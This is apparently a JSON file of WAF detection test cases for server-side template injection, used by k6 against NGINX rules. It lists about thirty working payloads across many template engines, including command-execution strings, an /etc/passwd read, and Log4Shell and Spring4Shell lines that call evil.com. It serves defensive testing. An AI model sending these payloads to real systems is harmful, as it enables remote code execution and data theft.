{
  "metadata": {
    "category": "ssti",
    "total_patterns": 34,
    "port": 80,
    "description": "k6 test patterns for Server-Side Template Injection attacks",
    "phase": "Phase 10 Stage 1",
    "updated": "2026-02-14"
  },
  "patterns": [
    {
      "id": "SSTI_JINJA_001",
      "name": "Jinja2 basic template injection test",
      "category": "ssti",
      "subcategory": "jinja2",
      "payload": "{{7*7}}",
      "encoded": "%7B%7B7%2A7%7D%7D",
      "port": 8010,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "Template injection"
    },
    {
      "id": "SSTI_JINJA_002",
      "name": "Jinja2 config disclosure injection",
      "category": "ssti",
      "subcategory": "jinja2",
      "payload": "{{config.items()}}",
      "encoded": "%7B%7Bconfig.items%28%29%7D%7D",
      "port": 8010,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Template injection"
    },
    {
      "id": "SSTI_JINJA_003",
      "name": "Jinja2 Lipsum Function Injection",
      "category": "ssti",
      "subcategory": "jinja2",
      "payload": "{{lipsum(1)}}",
      "encoded": "%7B%7Blipsum(1)%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 9: Jinja2 lipsum built-in function exploitation"
    },
    {
      "id": "SSTI_VEL_001",
      "name": "Velocity template runtime execution",
      "category": "ssti",
      "subcategory": "velocity",
      "payload": "#set($runtime = $runtime.getRuntime())$runtime.exec('whoami')",
      "encoded": "%23set%28%24runtime%20%3D%20%24runtime.getRuntime%28%29%29%24runtime.exec%28%27whoami%27%29",
      "port": 8010,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Spring4Shell attack"
    },
    {
      "id": "SSTI_VEL_002",
      "name": "Velocity class inspection RCE",
      "category": "ssti",
      "subcategory": "velocity",
      "payload": "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")",
      "encoded": "%24class.inspect%28%22java.lang.Runtime%22%29.type.getRuntime%28%29.exec%28%22id%22%29",
      "port": 8010,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Spring4Shell attack"
    },
    {
      "id": "SSTI_FREEMKR_001",
      "name": "FreeMarker template command execution",
      "category": "ssti",
      "subcategory": "freemarker",
      "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami\")}",
      "encoded": "%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%20%24%7Bex%28%22whoami%22%29%7D",
      "port": 8010,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "Template injection"
    },
    {
      "id": "SSTI_THYME_001",
      "name": "Thymeleaf expression injection",
      "category": "ssti",
      "subcategory": "thymeleaf",
      "payload": "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__",
      "encoded": "__%24%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__",
      "port": 8005,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Spring4Shell attack"
    },
    {
      "id": "SSTI_PEBBLE_001",
      "name": "Pebble command execution",
      "category": "ssti",
      "subcategory": "pebble",
      "payload": "{% set cmd = \"id\" %}{{ system(cmd) }}",
      "encoded": "%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D",
      "port": 8005,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection"
    },
    {
      "id": "SSTI_SMARTY_001",
      "name": "Smarty PHP code execution",
      "category": "ssti",
      "subcategory": "smarty",
      "payload": "{php}system(\"id\");{/php}",
      "encoded": "%7Bphp%7Dsystem(%22id%22)%3B%7B%2Fphp%7D",
      "port": 8005,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SSTI] Server-Side Template Injection detected"
    },
    {
      "id": "SSTI_TWIG_001",
      "name": "Twig file read",
      "category": "ssti",
      "subcategory": "twig",
      "payload": "{{\"/etc/passwd\"|file_excerpt(1,30)}}",
      "encoded": "%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D",
      "port": 8005,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Traversal] File inclusion attack detected"
    },
    {
      "id": "SSTI_MAKO_001",
      "name": "Mako Python execution",
      "category": "ssti",
      "subcategory": "mako",
      "payload": "${self.module.cache.util.os.system(\"id\")}",
      "encoded": "%24%7Bself.module.cache.util.os.system(%22id%22)%7D",
      "port": 8005,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection"
    },
    {
      "id": "SSTI_NUNJUCKS_001",
      "name": "Nunjucks Range Function Injection",
      "category": "ssti",
      "subcategory": "nunjucks",
      "payload": "{{range(10)}}",
      "encoded": "%7B%7Brange(10)%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 9: Nunjucks/Jinja2 range function for data enumeration"
    },
    {
      "id": "SSTI_EL_001",
      "name": "Expression Language Injection",
      "category": "ssti",
      "subcategory": "expression_language",
      "payload": "${7*7}",
      "encoded": "%24%7B7*7%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 9: Java/JSP Expression Language injection"
    },
    {
      "id": "SSTI_EJS_001",
      "name": "EJS Template Output Injection",
      "category": "ssti",
      "subcategory": "ejs",
      "payload": "<%=7*7%>",
      "encoded": "%3C%25%3D7*7%25%3E",
      "port": 80,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 9: EJS/ERB template output tag injection"
    },
    {
      "id": "SSTI_DJANGO_001",
      "name": "Django Debug Template Tag",
      "category": "ssti",
      "subcategory": "django",
      "payload": "{% debug %}",
      "encoded": "%7B%25%20debug%20%25%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX SSTI] Server-Side Template Injection detected",
      "description": "Phase 9: Django template debug tag for information disclosure"
    },
    {
      "id": "SSTI_JINJA_004",
      "name": "Jinja2 MRO Class Chain Injection",
      "category": "ssti",
      "subcategory": "jinja2",
      "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
      "encoded": "%7B%7B%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 10: Jinja2 MRO chain for arbitrary class access"
    },
    {
      "id": "SSTI_JINJA_005",
      "name": "Jinja2 Request Object MRO Injection",
      "category": "ssti",
      "subcategory": "jinja2",
      "payload": "{{request.__class__.__mro__[2].__subclasses__()}}",
      "encoded": "%7B%7Brequest.__class__.__mro__%5B2%5D.__subclasses__%28%29%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 10: Jinja2 request object MRO chain exploitation"
    },
    {
      "id": "SSTI_VEL_003",
      "name": "Velocity ProcessBuilder RCE",
      "category": "ssti",
      "subcategory": "velocity",
      "payload": "#set($x=$class.forName(\"java.lang.ProcessBuilder\"))",
      "encoded": "%23set%28%24x%3D%24class.forName%28%22java.lang.ProcessBuilder%22%29%29",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Spring4Shell attack",
      "description": "Phase 10: Velocity ProcessBuilder instantiation (matches Spring4Shell rule)"
    },
    {
      "id": "SSTI_HANDLE_001",
      "name": "Handlebars Constructor Access",
      "category": "ssti",
      "subcategory": "handlebars",
      "payload": "{{#with \"s\" as |string|}}{{string.sub \"constructor\"}}{{/with}}",
      "encoded": "%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%7B%7Bstring.sub%20%22constructor%22%7D%7D%7B%7B%2Fwith%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 10: Handlebars constructor access (needs XSS exception for 'constructor')"
    },
    {
      "id": "SSTI_HANDLE_002",
      "name": "Handlebars Lookup Constructor",
      "category": "ssti",
      "subcategory": "handlebars",
      "payload": "{{lookup (create-object) \"constructor\"}}",
      "encoded": "%7B%7Blookup%20%28create-object%29%20%22constructor%22%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 10: Handlebars lookup constructor (needs XSS exception for 'constructor')"
    },
    {
      "id": "SSTI_ERB_001",
      "name": "ERB System Command Execution",
      "category": "ssti",
      "subcategory": "erb",
      "payload": "<%= system(\"id\") %>",
      "encoded": "%3C%25%3D%20system%28%22id%22%29%20%25%3E",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 10: Ruby ERB template execution (requires rule condition addition for <%=)"
    },
    {
      "id": "SSTI_TORNADO_001",
      "name": "Tornado Import OS Execution",
      "category": "ssti",
      "subcategory": "tornado",
      "payload": "{%import os%}{{os.popen(\"id\").read()}}",
      "encoded": "%7B%25import%20os%25%7D%7B%7Bos.popen%28%22id%22%29.read%28%29%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 10: Tornado template OS command execution via {%import%}"
    },
    {
      "id": "SSTI_RAZOR_001",
      "name": "Razor .NET Process Execution",
      "category": "ssti",
      "subcategory": "razor",
      "payload": "@{var x = System.Diagnostics.Process.Start(\"cmd\");}",
      "encoded": "%40%7Bvar%20x%20%3D%20System.Diagnostics.Process.Start%28%22cmd%22%29%3B%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SSTI] Server-Side Template Injection detected",
      "description": "Phase 10: Razor .NET process execution (requires rule condition addition)"
    },
    {
      "id": "SSTI_PEBBLE_002",
      "name": "Pebble Set and Lookup Injection",
      "category": "ssti",
      "subcategory": "pebble",
      "payload": "{%set cmd='id'%}{{lookup(cmd)}}",
      "encoded": "%7B%25set%20cmd%3D%27id%27%25%7D%7B%7Blookup%28cmd%29%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection",
      "description": "Phase 10: Pebble template variable set and lookup execution"
    },
    {
      "id": "SSTI_FREEMKR_002",
      "name": "FreeMarker Protection Domain Access",
      "category": "ssti",
      "subcategory": "freemarker",
      "payload": "${.data_model.class.protectionDomain}",
      "encoded": "%24%7B.data_model.class.protectionDomain%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Spring4Shell attack",
      "description": "Phase 10: FreeMarker protectionDomain access (matches Spring4Shell rule)"
    },
    {
      "id": "SSTI_SPRING_001",
      "name": "Spring4Shell classLoader manipulation",
      "category": "ssti",
      "subcategory": "spring4shell",
      "payload": "class.module.classLoader.URLs[0]=jar:http://evil.com",
      "encoded": "class.module.classLoader.URLs%5B0%5D%3Djar%3Ahttp%3A%2F%2Fevil.com",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Spring4Shell attack"
    },
    {
      "id": "SSTI_LOG4S_001",
      "name": "Log4Shell JNDI LDAP injection",
      "category": "ssti",
      "subcategory": "log4shell",
      "payload": "${jndi:ldap://evil.com/exploit}",
      "encoded": "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fexploit%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Log4Shell attack"
    },
    {
      "id": "SSTI_PUG_001",
      "name": "Pug/Jade template injection",
      "category": "ssti",
      "subcategory": "pug",
      "payload": "#{7*7}",
      "encoded": "%23%7B7*7%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX Emerging Threat] Template injection"
    },
    {
      "id": "SSTI_EJS_002",
      "name": "EJS prototype chain exploitation",
      "category": "ssti",
      "subcategory": "ejs",
      "payload": "<%-global.process.mainModule.require('child_process')%>",
      "encoded": "%3C%25-global.process.mainModule.require%28%27child_process%27%29%25%3E",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SSTI] Server-Side Template Injection detected"
    },
    {
      "id": "SSTI_HBS_001",
      "name": "Handlebars RCE via with helper",
      "category": "ssti",
      "subcategory": "handlebars",
      "payload": "{{#with \"s\" as |string|}}{{/with}}",
      "encoded": "%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%7B%7B%2Fwith%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SSTI] Server-Side Template Injection detected"
    },
    {
      "id": "SSTI_MAKO_002",
      "name": "Mako OS command execution",
      "category": "ssti",
      "subcategory": "mako",
      "payload": "${__import__('os').popen('id').read()}",
      "encoded": "%24%7B__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection"
    },
    {
      "id": "SSTI_NUNJUCKS_002",
      "name": "Nunjucks constructor access",
      "category": "ssti",
      "subcategory": "nunjucks",
      "payload": "{{range.constructor(\"return this\")()}}",
      "encoded": "%7B%7Brange.constructor%28%22return%20this%22%29%28%29%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SSTI] Server-Side Template Injection detected"
    },
    {
      "id": "SSTI_JINJA_006",
      "name": "Jinja2 cycler class exploitation",
      "category": "ssti",
      "subcategory": "jinja2",
      "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
      "encoded": "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D",
      "port": 80,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Emerging Threat] Template injection"
    },
    {
      "id": "FP_SSTI_001",
      "name": "Normal Mustache template variable",
      "category": "ssti",
      "subcategory": "false_positive",
      "payload": "/template?name={{username}}",
      "encoded": "%2Ftemplate%3Fname%3D%7B%7Busername%7D%7D",
      "port": 80,
      "expected_detection": false,
      "severity": "info",
      "expected_rule": "NONE"
    }
  ]
}